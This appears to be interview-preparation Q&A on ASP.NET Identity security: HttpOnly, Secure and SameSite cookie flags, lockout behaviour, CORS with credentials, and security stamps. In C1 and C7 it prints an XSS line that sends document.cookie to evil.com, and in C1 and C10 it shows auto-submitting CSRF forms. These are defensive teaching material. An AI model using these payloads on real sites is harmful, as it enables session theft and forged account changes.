## SECTION C — ASP.NET IDENTITY, COOKIE SECURITY & LOCKOUT

> **Source:** Tasks 5–7 — password policy, account lockout, cookie hardening via `ConfigureApplicationCookie`.

---

### EASY

**C1.** [HIGH] What does `HttpOnly` on a cookie prevent? What does it NOT prevent?

<details>
<summary>The 5% Answer</summary>

**Prevents:** JavaScript accessing `document.cookie`. An XSS payload cannot read the session token and exfiltrate it.

**Does NOT prevent:**
- **CSRF (Cross-Site Request Forgery)** — browser attaches the cookie automatically on cross-site requests; no JS needed.
  - Fix: `options.Cookie.SameSite = SameSiteMode.Strict;`
- **Network interception (MITM)** — cookie travels in plaintext over HTTP.
  - Fix: `options.Cookie.SecurePolicy = CookieSecurePolicy.Always;`
- **XSS session abuse** — XSS makes authenticated API calls from the victim's tab; cookie attaches automatically even though JS can't read it.
  - Fix: CSP(Content Security Policy) header to block injected scripts from running.

**Practical impact:** `HttpOnly` prevents **session hijacking** (steal token → replay from another machine), not **session abuse** (XSS makes requests from inside the victim's tab).

**Full defence requires all three:**
| Flag | Prevents | C# setting |
|---|---|---|
| `HttpOnly` | Cookie theft via `document.cookie` | `options.Cookie.HttpOnly = true;` |
| `Secure` | Cookie over HTTP (MITM capture) | `options.Cookie.SecurePolicy = CookieSecurePolicy.Always;` |
| `SameSite=Strict` | Cookie on cross-site requests — CSRF (Cross-Site Request Forgery) | `options.Cookie.SameSite = SameSiteMode.Strict;` |

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"`HttpOnly` prevents XSS." `HttpOnly` prevents cookie theft via XSS. XSS itself — arbitrary JavaScript execution — is still fully functional. The attacker just can't steal the token to another machine.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning that even with `HttpOnly`, XSS can call `fetch('/api/account/address', { method: 'PUT', body: ... })` from the victim's tab and the cookie is attached automatically. `HttpOnly` only blocks `document.cookie` — it doesn't prevent XSS-driven API abuse.

</details>

<details>
<summary>Explanation</summary>

**Key terms:**

| Term | One-liner |
|---|---|
| XSS | Attacker injects JS that runs in the victim's browser |
| Session token | Random string in cookie = "this browser is authenticated" |
| Exfiltrate | Script reads data and sends it to attacker's server |
| CSRF (Cross-Site Request Forgery) | Attacker tricks the browser into sending a request using the victim's cookie |
| Network interception (MITM) | Someone on the same network reads unencrypted HTTP traffic |
| Session hijacking | Steal the token → replay it from attacker's machine |
| Session abuse | XSS makes requests from victim's browser — token never leaves |

---

**Step 1 — How sessions work:**
You log in → server creates a session token and stores it in your cookie → every request after that sends the cookie automatically → server reads it and knows who you are.

**Step 2 — The attack without `HttpOnly`:**
Attacker injects a script into a page you visit (XSS). That script runs in your browser and reads your token:
```js
fetch('https://evil.com/steal?c=' + document.cookie)
// attacker receives the token → pastes it in their browser → logged in as you from a different machine
```
That's **session hijacking**.

**Step 3 — What `HttpOnly` does:**
`document.cookie` returns `""`. The script has nothing to send. Token stays safe.

**Step 4 — What it doesn't cover:**

| Gap | What still happens | Fix |
|---|---|---|
| Browser attaches cookie to every request automatically | **CSRF (Cross-Site Request Forgery)** — attacker tricks your browser into sending a request; cookie goes with it, no JS needed | `SameSite=Strict` |
| Cookie travels in plaintext over HTTP | **Network interception** — anyone on the same network reads traffic and captures the token | `Secure` flag |
| XSS can still run code in your browser | **Session abuse** — script calls your API from your tab directly, cookie attaches automatically | CSP |

**Step 5 — Hijacking vs abuse:**
- **Hijacking:** steal the token, use it from a different machine. `HttpOnly` stops this.
- **Abuse:** XSS stays inside your browser and makes API calls on your behalf. Token never left. `HttpOnly` doesn't help.

**Step 6 — When you legitimately skip `HttpOnly`:**
Only for non-auth cookies JavaScript needs to read. Examples:
- `locale=en-GB` — Angular reads it to pick the right language without an API call
- Feature flag cookie — a client-side script reads it to decide which UI variant to show

Rule: **auth cookies → always `HttpOnly`. Non-sensitive UI state → fine to skip.**

---

**Code examples:**

**CSRF (Cross-Site Request Forgery)** — victim visits `evil.com` while logged in to `skinet.com`:
```html
<form method="POST" action="https://api.skinet.com/api/account/address">
  <input name="line1" value="1 Evil St">
</form>
<script>document.forms[0].submit();</script>
<!-- browser attaches the HttpOnly cookie → server sees authenticated POST -->
```

**XSS session abuse** — injected script runs inside the victim's tab:
```js
// document.cookie is "" — HttpOnly blocks theft
// but fetch still sends the cookie automatically:
fetch('/api/account/address', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ line1: '1 Evil St' })
})
// server sees authenticated PUT → address overwritten — token never left the browser
```

**MITM** — attacker on same network reads raw HTTP:
```
Cookie: .AspNetCore.Identity.Application=CfDJ8KlQ3m...
// SecurePolicy.Always forces HTTPS → this line never appears in plaintext
```

</details>

---

**C2.** [HIGH] What does `SlidingExpiration = false` mean for users? What is the security tradeoff vs `true`?

<details>
<summary>The 5% Answer</summary>

- **`false` (this project):** the cookie expires exactly `ExpireTimeSpan` (24h) from **login time**, regardless of activity. A user who logs in at 9am is logged out at 9am the next day even if they were actively using the app at 8:59am.
- **`true`:** the expiry resets to `ExpireTimeSpan` from the current time on each request. An active user never gets logged out.

**Security tradeoff:**
- `false` is more secure: abandoned sessions expire predictably. An attacker with a stolen session token has at most 24h of access regardless of usage.
- `true` is more user-friendly: no surprise logouts for active users. But a stolen session token remains valid indefinitely as long as anyone uses it — attacker-controlled activity extends the window.

This project chose `false` — e-commerce apps with stored payment info benefit from daily re-authentication. The UX cost (users log in once a day) is acceptable for the security gain.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"`SlidingExpiration = true` is always better UX." Not when the session can be stolen. Sliding expiration on a stolen session means indefinitely valid access — the attacker just keeps making requests to keep the token alive.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning PCI-DSS: payment card industry compliance requires re-authentication after periods of inactivity. `SlidingExpiration = false` with a 24h absolute expiry satisfies this requirement. Banking and fintech apps use `false` universally — session continuity is a security liability, not a feature.

</details>

---

### MEDIUM

**C3.** [HIGH] A user fails to log in 5 times. Walk through exactly what ASP.NET Identity does in the database and what subsequent attempts return.

<details>
<summary>The 5% Answer</summary>

**After the 5th failed attempt:**
1. Identity executes: `UPDATE AspNetUsers SET LockoutEnd = @now + 15min WHERE Id = @id`
2. Identity **resets `AccessFailedCount` to 0** simultaneously — the counter's job is done
3. Any subsequent login attempt during the lockout window:
   - Identity checks `LockoutEnd > UtcNow` **before** evaluating the password
   - If locked: returns `SignInResult.LockedOut` immediately, password not checked
   - Response to the client: `401 Unauthorized` — identical to wrong password (intentional, prevents enumeration)

**Database state during lockout:**
```sql
SELECT Email, LockoutEnd, AccessFailedCount
FROM AspNetUsers WHERE Email = 'test@test.com'
-- LockoutEnd: 2025-04-20 14:15:00 UTC  (future → locked)
-- AccessFailedCount: 0                  (reset, not 5)
```

**After `LockoutEnd` passes:**
- `UserManager.IsLockedOutAsync(user)` returns `false`
- Next failed attempt increments `AccessFailedCount` again from 0

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"After lockout the user needs an admin to reset their account." Lockout is time-based (`DefaultLockoutTimeSpan = 15min`), not permanent. No admin action needed unless `LockoutEnd = DateTime.MaxValue` (permanent lockout) is configured explicitly.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning that returning the same 401 for "wrong password" AND "account locked" is a deliberate security design — a different status code would let attackers enumerate whether an account exists and whether it's currently locked, providing a timing oracle for targeted brute-force attacks.

</details>

---

**C4.** [HIGH] [OUT-OF-SCOPE] Compare `SameSite=Strict` vs `SameSite=Lax` for this project. Describe a real scenario where `Strict` would break something `Lax` wouldn't.

<details>
<summary>The 5% Answer</summary>

- **`Lax`:**
  - Cookie **sent** on top-level navigations: link click, bookmark, address bar
  - Cookie **sent** on all same-site requests
  - Cookie **blocked** on cross-site background requests: `fetch`, form POST, images loaded from another site
  - CSRF (Cross-Site Request Forgery) attacks rely on background requests → `Lax` still blocks CSRF (Cross-Site Request Forgery) while keeping email links and social shares working
  - ASP.NET Core default since .NET 6
- **`Strict`:** cookie never sent on any cross-site request — including top-level GET navigations.

**Where `Strict` breaks things `Lax` doesn't:**

1. **"View your order" email links:** a user receives an order confirmation email and clicks the link. The browser navigates from the email client's domain to `skinet.com` — that's a cross-site navigation. `Strict` means no session cookie attached → user sees the login page despite having an active session.

2. **OAuth/Social login flows:** IdP (Google, GitHub) redirects back to your app after authentication. That redirect is cross-site. `Strict` → cookie not attached on redirect → app sees user as unauthenticated after successful OAuth.

3. **Bookmark/referral links from other sites:** sharing a product link on Twitter, clicking through an affiliate partner — all are cross-site navigations that `Strict` blocks.

**Why this project uses `Strict`:**
- No OAuth (cookie-only auth, no external IdPs in scope)
- The cost (re-login from email links) is acceptable
- Maximum CSRF (Cross-Site Request Forgery) protection is the priority

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"Always use `Strict` for maximum security." The right choice depends on architecture. A site with OAuth login, email links, or affiliate traffic should use `Lax` — `Strict` would silently break user flows that require cross-site navigation.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Knowing that same-site is determined by **eTLD+1** (registrable domain), not the full hostname — so subdomains like `app.skinet.com` + `api.skinet.com` are same-site and `Strict` won't block them, but `app.skinet.com` + `api.otherdomain.com` are cross-site and `Strict` will.

</details>

<details>
<summary>Explanation</summary>

**eTLD+1 same-site boundary:**

| Frontend | Backend | Same-site? | Strict blocks? |
|---|---|---|---|
| `app.skinet.com` | `api.skinet.com` | Yes — share `skinet.com` | No — cookie sent |
| `app.skinet.com` | `api.otherdomain.com` | No — different domains | **Yes — cookie blocked** |
| `localhost:4200` | `localhost:7096` | Yes — both `localhost` | No — works in dev |

The `otherdomain.com` row is the trap: if your API were on a completely separate domain, `Strict` would silently break your entire app — every authenticated request would be rejected. Subdomains sharing the same registrable domain are safe; separate domains are not.

---

**OAuth vs cookie-only:**

| | OAuth/OIDC | Cookie-only |
|---|---|---|
| Who verifies the user | External IdP (Google, Azure AD) | Your own server |
| Who stores passwords | The IdP — you never see them | You (bcrypt) |
| Used by | SaaS, enterprise B2B, marketplaces | Banking, government, internal tools, this project |
| After login | Your server still issues a session cookie | Session cookie |

**Can you use both?** Yes — most serious apps do. OAuth handles the front door, cookie handles staying inside:

| Step | Mechanism |
|---|---|
| "Sign in with Google" button | OAuth/OIDC |
| "Sign in with email" button | Cookie-only |
| All requests after login | Session cookie (both paths converge here) |

**Why `Strict` breaks OAuth:** the IdP redirect back to your app is a cross-site GET navigation — `Strict` withholds the cookie on that redirect → app sees the user as unauthenticated right after a successful login. `Lax` allows it.

---

**HttpOnly is not an auth method — it's a cookie attribute:**

| Login option | Auth method | After login |
|---|---|---|
| "Sign in with Google" | OAuth/OIDC | Server issues a session cookie |
| "Sign in with email + password" | Credential-based auth | Server issues a session cookie |

Both paths end with a session cookie. `HttpOnly` is just a security flag on that cookie — it means JavaScript can't read it. It applies to both cases regardless of how the user logged in.

- **Cookie-only auth** = no OAuth, you manage passwords yourself (this project)
- **HttpOnly** = a flag on the cookie, not an auth method

</details>

---

**C5.** [HIGH] What does `ConfigureApplicationCookie` target specifically? What breaks if you use `AddCookie("MyCookie")` instead?

<details>
<summary>The 5% Answer</summary>

`ConfigureApplicationCookie` modifies the options for `IdentityConstants.ApplicationScheme` — the specific cookie scheme that `AddIdentityApiEndpoints` registers internally. It's equivalent to:
```csharp
services.Configure<CookieAuthenticationOptions>(IdentityConstants.ApplicationScheme, options => ...);
```

**What breaks with `AddCookie("MyCookie")`:**
This registers a **new, separate** cookie scheme named `"MyCookie"`. Identity's own scheme (`"Identity.Application"`) remains with default settings:
- `HttpOnly = true` (default, fine)
- `SecurePolicy = CookieSecurePolicy.SameAsRequest` (default — allows HTTP)
- `SameSite = SameSiteMode.Lax` (default — less restrictive)
- `ExpireTimeSpan = TimeSpan.FromDays(14)` (default — 2 weeks)

Your hardened settings apply to `"MyCookie"` — a scheme nothing uses. Identity continues using its unhardened scheme. You'd have a false sense of security.

**Correct:**
```csharp
services.ConfigureApplicationCookie(options => {
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
    options.Cookie.SameSite = SameSiteMode.Strict;
    options.ExpireTimeSpan = TimeSpan.FromHours(24);
    options.SlidingExpiration = false;
});
```

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"Use `AddAuthentication().AddCookie(...)` with your settings." Same problem — that registers a new scheme. Identity uses `IdentityConstants.ApplicationScheme`, not whatever name you choose.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning that `IdentityConstants.ApplicationScheme` is the literal string `"Identity.Application"` — you can verify in the ASP.NET Identity source. Calling `ConfigureApplicationCookie` is the idiomatic helper; calling `services.Configure<CookieAuthenticationOptions>("Identity.Application", ...)` is equivalent and more explicit about the scheme name.

</details>

---

**C6.** [HIGH] `options.Lockout.AllowedForNewUsers` defaults to `true`. What does it control, and what specific attack window opens if it is set to `false`?

<details>
<summary>The 5% Answer</summary>

**Common trap:** many candidates assume the default is `false` — it is `true`. The framework protects new users by default.

`AllowedForNewUsers = true` makes `CreateAsync` store `LockoutEnabled = true` on every new row. If set to `false`, `LockoutEnabled = false` is stored instead — Identity checks this per-row column before incrementing `AccessFailedCount`, so **lockout never fires** for that user regardless of `MaxFailedAccessAttempts`.

**Attack window when `false`:** from registration, an attacker can attempt unlimited passwords — credential-stuffing 10,000 breached passwords hits no threshold.

**Migration catch:** changing the config doesn't fix existing users — Identity checks the per-row column, not the options value:
```sql
UPDATE AspNetUsers SET LockoutEnabled = 1 WHERE LockoutEnabled = 0;
```

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
Saying the default is `false` — it's `true`. The real risk is `DefaultLockoutTimeSpan = 5min` (too short for production) and assuming the per-row `LockoutEnabled` column is set correctly for existing users when you change the config.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Knowing the config change is not retroactive — existing `LockoutEnabled = 0` rows stay unprotected until you run the migration SQL.

</details>

---

### HARD

**C7.** [HIGH] [OUT-OF-SCOPE] Find the 3 security vulnerabilities in this cookie configuration and describe the attack each enables:

```csharp
services.ConfigureApplicationCookie(options => {
    options.Cookie.HttpOnly = false;
    options.Cookie.SecurePolicy = CookieSecurePolicy.SameAsRequest;
    options.Cookie.SameSite = SameSiteMode.None;
    options.ExpireTimeSpan = TimeSpan.FromDays(30);
    options.SlidingExpiration = true;
});
```

<details>
<summary>The 5% Answer</summary>

**Vulnerability 1 — `HttpOnly = false` → XSS-based session hijacking:**
JavaScript can read `document.cookie`. An XSS payload exfiltrates the session token:
```js
fetch('https://evil.com/steal?c=' + document.cookie)
```
The attacker receives the cookie, uses it from their own machine, and has full session access from anywhere — not just the victim's browser.

**Vulnerability 2 — `SecurePolicy = SameAsRequest` → MITM cookie theft:**
The cookie is transmitted in plaintext over HTTP. A network attacker (coffee shop WiFi, corporate proxy, ISP) reads the session token directly from unencrypted HTTP traffic. `CookieSecurePolicy.Always` forces HTTPS-only transmission.

**Vulnerability 3 — `SameSite = None` + `SlidingExpiration = true` → indefinite CSRF (Cross-Site Request Forgery) session:**
`None` allows cross-site cookie attachment — any site can make authenticated requests with the victim's session. With sliding expiration, a stolen (or attacker-kept-alive) session never expires while in use. An attacker who bookmarks `https://api.skinet.com/api/account/email?change=attacker@evil.com` can keep triggering it from the victim's browser indefinitely.

**Combined consequence:** XSS or MITM yields a 30-day, continuously renewable session token readable by JavaScript over HTTP, usable from any origin. Full account takeover with no expiration.

**Production consequence:** any XSS vulnerability (even a comment box or search field) becomes full account takeover with persistent access.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
Only identifying one vulnerability. A security-minded senior identifies all three independently and can articulate the specific attack for each. Partial answers suggest surface-level security knowledge.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning that `SameSite=None` without `Secure` is silently upgraded to `Lax` by modern browsers (Chrome 80+). So the `SameAsRequest` policy inadvertently "saves" the `None` setting on HTTP connections — but the browser's protection is not a substitute for correct server configuration. Don't rely on browser behaviour to compensate for insecure cookie settings.

</details>

---

**C8.** [HIGH] `AccessFailedCount` is 0 after an account lockout. A junior developer says "the counter is broken and lockout isn't working." Walk through why this is correct behavior and how to correctly verify lockout status.

<details>
<summary>The 5% Answer</summary>

**Why `AccessFailedCount = 0` is correct by design:**
The counter's purpose is "count failed attempts toward the lockout trigger threshold." Once that threshold is hit and `LockoutEnd` is set, the counter's job is complete. Identity resets it atomically when setting `LockoutEnd`.

**Why it must reset:**
If the counter stayed at 5 after lockout, then after the 15-minute lockout expires, the user's very next failed login would immediately re-lock them (1 failure = already at max). Users would get permanently locked after a temporary lockout — any failed login would become permanent.

By resetting to 0, users get a fresh set of attempts after each lockout period.

**How to correctly verify lockout status:**
```csharp
// Correct check — uses LockoutEnd, not AccessFailedCount
var isLocked = await userManager.IsLockedOutAsync(user);

// Direct SQL check
SELECT Email, LockoutEnd, AccessFailedCount
FROM AspNetUsers WHERE Email = 'test@test.com'
-- Active lockout: LockoutEnd is a future UTC timestamp
-- Expired lockout: LockoutEnd is null or past
-- AccessFailedCount: irrelevant to lockout state
```

`UserManager.IsLockedOutAsync(user)` is the single authoritative check — don't write `user.AccessFailedCount >= MaxAttempts` in application code.

**Production consequence:** code that checks `AccessFailedCount >= MaxAttempts` to determine lockout state always returns `false` after lockout fires — the counter resets to 0. Locked accounts silently pass an `AccessFailedCount`-based check and are allowed to attempt login. The lockout exists in the DB; the check in application code is wrong.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"Set `MaxFailedAccessAttempts = 0` to fix the 'broken' counter." That disables lockout entirely — `0` means "no limit." The junior developer would accidentally remove brute-force protection while trying to debug it.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning that `UserManager.GetLockoutEndDateAsync(user)` returns a `DateTimeOffset?` — null means never locked. A future value means currently locked. A past value means previously locked. This gives you the exact expiry time for user-facing "locked until X" messages, which improves UX over the generic "account locked" message.

</details>

---

**C9.** [HIGH] Design the complete authentication security configuration for a B2C e-commerce app with cookie-only auth, no external IdPs, and stored payment data. For each setting, justify the specific value chosen and identify what production attack it prevents.

<details>
<summary>The 5% Answer</summary>

```csharp
// Password policy
options.Password.RequiredLength = 12;                              // entropy floor — raises brute-force cost
options.Password.RequireUppercase = true;                          // blocks all-lowercase dictionary attacks
options.Password.RequireDigit = true;                              // blocks pure-word attacks
options.Password.RequireNonAlphanumeric = true;                    // forces character class diversity

// Lockout
options.Lockout.MaxFailedAccessAttempts = 5;                       // brute-force threshold
options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15); // throttles credential stuffing
options.Lockout.AllowedForNewUsers = true;                         // lockout from day 1, not after first success

// Cookie
options.Cookie.HttpOnly = true;                                    // blocks XSS token theft
options.Cookie.SecurePolicy = CookieSecurePolicy.Always;           // HTTPS-only, blocks MITM
options.Cookie.SameSite = SameSiteMode.Strict;                     // blocks CSRF (Cross-Site Request Forgery)
options.ExpireTimeSpan = TimeSpan.FromHours(24);                   // absolute session cap
options.SlidingExpiration = false;                                 // stolen token expires predictably
```

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:**
"More complexity requirements = more security." NIST SP 800-63B (2024) explicitly disagrees: mandatory complexity rules encourage predictable patterns (appending `!` to a dictionary word). Length and breach-list checking provide more entropy than complexity rules.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:**
Mentioning `IPasswordValidator<TUser>` — ASP.NET Identity's extensibility point for custom password validation. A `HaveIBeenPwnedPasswordValidator` that rejects passwords found in breach databases (using k-anonymity API calls to `api.pwnedpasswords.com`) is far more effective than any complexity rule. This is a 3-line integration using the `HibpPasswordValidator` NuGet package.

</details>

---

**C10.** [HIGH] [OUT-OF-SCOPE] Show the exact HTTP request a CSRF (Cross-Site Request Forgery) attack sends against this app when `SameSite=None; Secure` is misconfigured. Identify which header would be absent with `SameSite=Strict` and why that stops the attack.

<details>
<summary>The 5% Answer</summary>

**Attack setup:** victim is logged in to `https://skinet.com`. Attacker hosts `evil.com` with this auto-submitting page:

```html
<form id="f" method="POST" action="https://api.skinet.com/api/account/address">
  <input name="firstName" value="Attacker">
  <input name="line1" value="1 Evil St">
  <input name="city" value="Hacktown">
  <input name="country" value="GB">
</form>
<script>document.getElementById('f').submit();</script>
```

**Exact HTTP request the browser sends with `SameSite=None`:**
```
POST /api/account/address HTTP/1.1
Host: api.skinet.com
Origin: https://evil.com
Referer: https://evil.com/attack.html
Cookie: .AspNetCore.Identity.Application=CfDJ8KlQ3m...   ← browser attaches it
Content-Type: application/x-www-form-urlencoded

firstName=Attacker&line1=1+Evil+St&city=Hacktown&country=GB
```

**With `SameSite=Strict` — Cookie header is absent:**
```
POST /api/account/address HTTP/1.1
Host: api.skinet.com
Origin: https://evil.com
Referer: https://evil.com/attack.html
Content-Type: application/x-www-form-urlencoded
                                          ← no Cookie header
firstName=Attacker&line1=1+Evil+St&city=Hacktown&country=GB
```

`[Authorize]` returns `401` — the request is unauthenticated. Attack is dead.

**Why `Strict` stops it:** the browser's cookie-sending logic enforces `SameSite=Strict` before the request leaves the machine. The attacker cannot override it from JavaScript or form submission — it's a browser enforcement, not a server check.

**Production consequence:** with `SameSite=None`, any page the victim's browser loads can silently overwrite shipping addresses, trigger password resets, or initiate checkouts. The victim never sees a prompt.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:** "Checking the `Origin` or `Referer` header on the server stops CSRF (Cross-Site Request Forgery)." Both headers can be absent (privacy settings, HTTPS→HTTP transitions) or spoofed in edge cases. `SameSite` enforcement is at the browser layer — the attacker has no influence over it.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:** Knowing the **synchronizer token** pattern as the fallback when `SameSite=Strict` isn't viable (OAuth redirects require `Lax`). A cryptographic token embedded in forms is validated server-side. The attacker's forged form can't read the victim's DOM (same-origin policy) and therefore can't include a valid token — even with the cookie attached.

</details>

---

**C11.** [MEDIUM] [OUT-OF-SCOPE] A cookie-authenticated ASP.NET Core API configures its CORS policy with `AllowAnyOrigin().AllowCredentials()`. Why does this throw a runtime error, and what does the exact exception say?

<details>
<summary>The 5% Answer</summary>

**ASP.NET Core throws at runtime on the first CORS request** (not at startup — the app starts fine):
```
ArgumentException: The CORS protocol does not allow specifying a wildcard
(any) origin and credentials at the same time. Configure either a wildcard origin
or a list of specific origins, not both. (Parameter 'policy')
```

**Why the spec prohibits it:**
RFC 6454 (Origins) and the CORS specification: if the server responds with `Access-Control-Allow-Origin: *`, the browser must ignore `Access-Control-Allow-Credentials: true`. A browser that sent cookies to `*` would expose session cookies to any site that happens to share the user's browser — a trivial CSRF (Cross-Site Request Forgery) vector. The RFC authors closed this deliberately.

**This project's fix:**
```csharp
services.AddCors(options => options.AddPolicy("CorsPolicy", policy =>
    policy
        .WithOrigins(
            "http://localhost:4200",
            "https://localhost:4200",
            "https://skinet-2025-test.azurewebsites.net")
        .AllowAnyHeader()
        .AllowAnyMethod()
        .AllowCredentials()));   // safe — specific origins, not wildcard
```

`AllowAnyHeader()` is safe here — the origin whitelist is the real protection. Any origin not in the list gets a CORS rejection at the preflight stage.

**Production consequence:** `AllowAnyOrigin()` with `AllowCredentials()` does not fail at startup — it throws on the first cross-origin request. Without a cross-origin test in CI, this reaches prod silently. But removing `AllowCredentials()` to make it compile creates a silent regression — Angular's auth cookies are never sent, all authenticated API calls return 401.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:** "Remove `AllowCredentials()` to fix the error — we'll add it back later." Without `AllowCredentials()`, the browser strips cookies from all cross-origin requests regardless of `withCredentials: true` on the Angular side. The fix silently breaks authentication.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:** Knowing that `AllowAnyHeader()` is acceptable with specific origins because the origin whitelist is the CORS security boundary, not the header list. Headers are checked post-origin validation — an attacker whose origin isn't in the list never reaches the header check.

</details>

---

## ⚡ Syntax Quick-Fire

**C-QF1.** [HIGH] What is the literal string value of `IdentityConstants.ApplicationScheme`?

<details>
<summary>The 5% Answer</summary>

`"Identity.Application"` — the internal scheme name that `AddIdentityApiEndpoints` registers. `ConfigureApplicationCookie` is a helper that targets exactly this scheme. Calling `AddCookie("MyCookie")` registers a separate scheme that nothing uses — Identity's cookie keeps its insecure defaults.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:** Registering a new cookie scheme with custom settings and assuming it applies to Identity. The hardened settings silently apply to an unused scheme — Identity's `"Identity.Application"` cookie remains with defaults (`SecurePolicy.SameAsRequest`, `SameSite.Lax`, 14-day expiry).

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:** Knowing `services.Configure<CookieAuthenticationOptions>(IdentityConstants.ApplicationScheme, opts => ...)` is equivalent to `ConfigureApplicationCookie` — more explicit about what scheme is being targeted, useful for debugging or when configuring multiple schemes.

</details>

---

**C-QF2.** [HIGH] C# — `DateTime` vs `DateTimeOffset` — which does ASP.NET Identity use for `LockoutEnd` and why?

<details>
<summary>The 5% Answer</summary>

Identity uses **`DateTimeOffset?`** for `LockoutEnd`. `DateTimeOffset` always stores the UTC offset alongside the value — comparisons are unambiguous regardless of the server's local time zone. `DateTime.Kind` can be `Unspecified`, causing silent mis-comparisons when a UTC value is treated as local time.

```csharp
// Comparing a UTC DateTime to server local time silently returns wrong results
// DateTimeOffset carries offset — comparison is always correct
var isLocked = user.LockoutEnd > DateTimeOffset.UtcNow;
```

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:** Using `DateTime.Now` to compare against `LockoutEnd`. `DateTime.Now` is server local time; `LockoutEnd` is stored as UTC. On a server not set to UTC, the comparison is off by the UTC offset — users are locked out longer or shorter than configured.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:** Always using `DateTimeOffset.UtcNow` for timestamps in any distributed or cloud system. Azure VMs default to UTC, but developer machines and some legacy servers don't — `DateTimeOffset` makes the offset explicit and eliminates the entire class of time zone bugs.

</details>

---

**C-QF3.** [HIGH] After a password reset, does the user's existing auth cookie immediately become invalid?

<details>
<summary>The 5% Answer</summary>

**Not by default.** The cookie contains a security stamp issued at login time. Without `SecurityStampValidator`, the server never checks whether the stamp is still current — a stolen session cookie remains valid until natural expiry even after a password change.

**Enable it:**
```csharp
services.Configure<SecurityStampValidatorOptions>(opts =>
    opts.ValidationInterval = TimeSpan.FromMinutes(30));
```

Identity updates the security stamp on password change, role change, or explicit invalidation. On the next request after the validation interval, the validator detects the stale stamp and rejects the cookie — forcing re-login.

</details>

<details>
<summary>Red Flag</summary>

**Red Flag:** "The cookie is tied to the password hash, so it expires when the password changes." The cookie is tied to the **security stamp** — a separate random value. It is not derived from the password hash. Without the validator running, the stamp is never checked post-login.

</details>

<details>
<summary>Green Flag</summary>

**Green Flag:** Setting a short `ValidationInterval` (e.g., 30 minutes) for high-security apps — any session in use gets re-validated against the current security stamp every 30 minutes. Combine with `SlidingExpiration = false` for a predictable, auditable session lifecycle.

</details>
